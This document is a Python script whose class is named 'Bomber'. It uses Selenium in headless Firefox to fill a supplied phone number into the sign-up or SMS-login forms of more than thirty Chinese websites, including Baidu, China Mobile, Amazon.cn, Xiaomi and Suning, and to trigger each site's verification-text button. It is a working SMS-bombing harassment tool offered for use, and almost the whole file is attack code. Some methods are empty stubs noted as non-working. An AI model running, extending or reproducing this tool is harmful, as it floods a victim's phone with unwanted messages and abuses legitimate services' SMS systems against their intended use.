# coding: utf-8

__author__ = "lau.wenbo"

import time
from selenium import webdriver

class Bomber(object):
    def __init__(self, phone):
        self.phone = phone
        self.options = webdriver.FirefoxOptions()
        self.options.add_argument('--headless') # 后台模式

    # 百度
    def func0(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.baidu.com/')
        browser.find_element_by_xpath('//*[@id="u1"]/a[7]').click()
        browser.find_element_by_xpath('//*[@id="TANGRAM__PSP_10__footerULoginBtn"]').click()
        browser.find_element_by_xpath('//*[@id="TANGRAM__PSP_10__smsSwitchWrapper"]').click()
        browser.find_element_by_xpath('//*[@id="TANGRAM__PSP_10__smsPhone"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="TANGRAM__PSP_10__smsTimer"]').click()
        browser.quit()

    # 1号店
    def func1(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://passport.yhd.com/passport/register_input.do')
        browser.find_element_by_xpath('//*[@id="userName"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="validPhoneCodeDiv"]/a').click()
        browser.find_element_by_xpath('//*[@id="validPhoneCodeDiv"]/a').click()
        browser.quit()

    # 中国移动
    def func2(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://login.10086.cn/login.html')
        browser.find_element_by_xpath('//*[@id="sms_login_1"]').click()
        browser.find_element_by_xpath('//*[@id="sms_name"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="getSMSPwd1"]').click()
        browser.quit()

    # 51book
    def func3(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://caigou.51book.com/caigou/manage/designatedRegistryNewSignon.in')
        browser.find_element_by_xpath('//*[@id="cg_06"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="sendMSgBtu"]').click()
        browser.quit()

    # 世界邦
    def func4(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.shijiebang.com/reg/')
        browser.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/ul[1]/li[1]/a').click()
        browser.find_element_by_xpath('/html/body/div[8]/div[2]/div/div[2]/div/label[2]/input').click()
        browser.find_element_by_xpath('/html/body/div[8]/div[2]/div/div[2]/table[2]/tbody/tr[1]/td/div/input').send_keys(self.phone)
        browser.find_element_by_xpath('/html/body/div[8]/div[2]/div/div[2]/table[2]/tbody/tr[2]/td/div/button').click()
        browser.quit()

    # 优酷
    def func5(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://account.youku.com/register.htm')
        browser.find_element_by_xpath('//*[@id="passport"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="password"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="repeatPsd"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="getMobileCode"]').click()
        browser.quit()

    # 亚马逊
    def func6(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.amazon.cn/ap/register?_encoding=UTF8&openid.assoc_handle=cnflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.cn%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_newcust')
        # browser.find_element_by_xpath('//*[@id="nav-flyout-ya-newCust"]/a').click()
        browser.find_element_by_xpath('//*[@id="ap_customer_name"]').send_keys('Mike998')
        browser.find_element_by_xpath('//*[@id="ap_phone_number"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="ap_password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="ap_register_form"]/div/div/div[5]/div/label/input').click()
        browser.find_element_by_xpath('//*[@id="continue"]').click()
        browser.quit()

    # 私否
    def func7(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://segmentfault.com/')
        browser.find_element_by_xpath('/html/body/div[2]/nav/div[2]/div[2]/ul/li/a[1]').click()
        browser.find_element_by_xpath('/html/body/div[5]/div/div/div[2]/div/div/div/form/div[4]/a').click()
        browser.find_element_by_xpath('/html/body/div[5]/div/div/div[2]/div/div/div/form/div[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('/html/body/div[5]/div/div/div[2]/div/div/div/form/div[2]/div[1]/span/button').click()
        browser.quit()

    # 中瑞财富
    def func8(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.zrcaifu.com/register')
        browser.find_element_by_xpath('//*[@id="register-ul"]/li[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="register-ul"]/li[1]/input').click()
        browser.find_element_by_xpath('//*[@id="register-ul"]/li[2]/input').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="register-ul"]/li[2]/input').click()
        browser.find_element_by_xpath('//*[@id="register-ul"]/li[3]/input').send_keys('pwd123456')
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="sendsms-for-regiter"]').click()
        browser.quit()

    # 97格格
    def func9(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.97gg.net/Account/Register')
        browser.find_element_by_xpath('//*[@id="phoneRegistTab"]/tab').click()
        browser.find_element_by_xpath('//*[@id="UserName"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="Password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="ConfirmPassword"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="chkCodeSendBtn"]').click()
        browser.quit()

    # 千米
    def func10(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.1000.com/reg?us=3W-head')
        browser.find_element_by_xpath('//*[@id="react-content"]/div/div/div/div[2]/form/div[2]/div[2]/div/div/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="send_code"]').click()
        browser.quit()

    # 唯品会
    def func11(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://passport.vip.com/register')
        browser.find_element_by_xpath('//*[@id="J_mobile_name"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="J_mobile_verifycode_btn"]').click()
        browser.quit()

    # 嗨厨房
    def func12(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://m.haichufang.com/reg.html')
        browser.find_element_by_xpath('//*[@id="login"]/div[2]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="login"]/div[2]/div[2]/div[1]').click()
        browser.quit()

    # 好美家
    def func13(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.jaja123.com/web/register')
        browser.find_element_by_xpath('/html/body/div/div[4]/form/div/div[1]/div[2]/div[1]/input').send_keys(u'张飞')
        browser.find_element_by_xpath('/html/body/div/div[4]/form/div/div[1]/div[3]/div[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('/html/body/div/div[4]/form/div/div[1]/div[4]/div[1]/input').send_keys('pwd123456')
        browser.find_element_by_xpath('/html/body/div/div[4]/form/div/div[1]/div[5]/div[1]/input').send_keys('pwd123456')
        browser.find_element_by_xpath('/html/body/div/div[4]/form/div/div[1]/div[6]/div[1]/div/span/button').click()
        browser.quit()

    # 小米
    def func14(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://cn.account.xiaomi.com/pass/register?_locale=zh_CN')
        browser.find_element_by_xpath('//*[@id="main_container"]/div[3]/div[1]/div/div[3]/div[2]/label/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="main_container"]/div[3]/div[1]/div/div[6]/input').click()
        browser.quit()

    # 巨人网络
    def func15(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://reg.ztgame.com/')
        browser.find_element_by_xpath('//*[@id="reg_form"]/div[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="reg_form"]/div[2]/input[2]').click()
        browser.quit()

    # 微盟
    def func16(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://account.weimob.com/register')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="signUpForm"]/div[3]/a').click()
        browser.quit()

    # 商品宅配
    def func17(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.homekoo.com/zhixiao/cuxiao/index.php')
        browser.find_element_by_xpath('//*[@id="username5"]').send_keys(u'张飞')
        browser.find_element_by_xpath('//*[@id="tel5"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="submit_img5"]').click()
        browser.quit()

    # 快乐购
    def func18(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.happigo.com/register/')
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="send_auth_code"]').click()
        browser.quit()

    # 手机中国
    def func19(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://passport.cnmo.com/register/')
        browser.find_element_by_xpath('//*[@id="m_mobile"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="m_uname"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="m_password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="m_confirm"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="m_getcode"]').click()
        browser.quit()

    # 苏宁
    def func20(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://reg.suning.com/person.do')
        browser.find_element_by_xpath('//*[@id="mobileAlias"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="sendSmsCode"]').click()
        browser.quit()

    # 爱奇艺
    def func21(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.iqiyi.com/iframe/loginreg?is_reg=1&')
        browser.find_element_by_xpath('/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/div[2]/i').click()
        browser.find_element_by_xpath('/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/div[1]/div[2]/input').send_keys(self.phone)
        browser.find_element_by_xpath('/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/a[2]').click()
        browser.quit()

    def func22(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.facebank.cn/user.html')
        # browser.switch_to.alert()
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="getSmsCode"]').click()
        time.sleep(1)
        browser.quit()

    # 支付宝
    def func23(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://memberprod.alipay.com/account/reg/index.htm')
        # 焦点问题未解决，支付宝接口无效
        browser.quit()

    # 粉笔网
    def func24(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://fenbi.com/web/signup')
        # 弹窗问题，接口无效
        browser.quit()

    def func25(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://jrh.financeun.com/Login/jrwLogin?web=jrw')
        browser.find_element_by_xpath('//*[@id="login-segment-phoneLogin"]').click()
        browser.find_element_by_xpath('//*[@id="quickMobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="quickSendMsgCode"]').click()
        browser.quit()

    def func26(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.maifupay.com/register')
        browser.find_element_by_xpath('/html/body/div[2]/div/div[1]/form/div[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="sendVerifySmsButton"]').click()
        browser.quit()

    def func27(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://passport.ingping.com/reg/index?retUrl=https%3A%2F%2Fwww.ingping.com&fxPid=')
        browser.find_element_by_xpath('//*[@id="phoneNum"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="sendRegMsgA"]').click()
        browser.quit()

    def func28(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.decathlon.com.cn/zh/create')
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="login-button"]').click()
        time.sleep(1)
        browser.quit()

    # 迅雷
    def func29(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://vip.xunlei.com/?referfrom=v_pc_qtcp_ggong_xlhy')
        # 类似支付宝页面无法解决焦点问题，猜测用JS解决
        browser.quit()

    def func30(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://my.ruanmei.com/?page=register')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="sendsms"]').click()
        browser.quit()

    def func31(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.juhe.cn/register')
        browser.find_element_by_xpath('//*[@id="username"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="mobilephone"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="reg_smsbtn"]').click()
        time.sleep(1)
        browser.quit()

    def func32(self):
        browser = webdriver.Firefox(firefox_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://passport.zongheng.com/webreg?location=http%3A%2F%2Fwww.zongheng.com%2F')
        browser.find_element_by_xpath('//*[@id="regphone"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('/html/body/div[3]/div[2]/p[3]/span').click()
        browser.quit()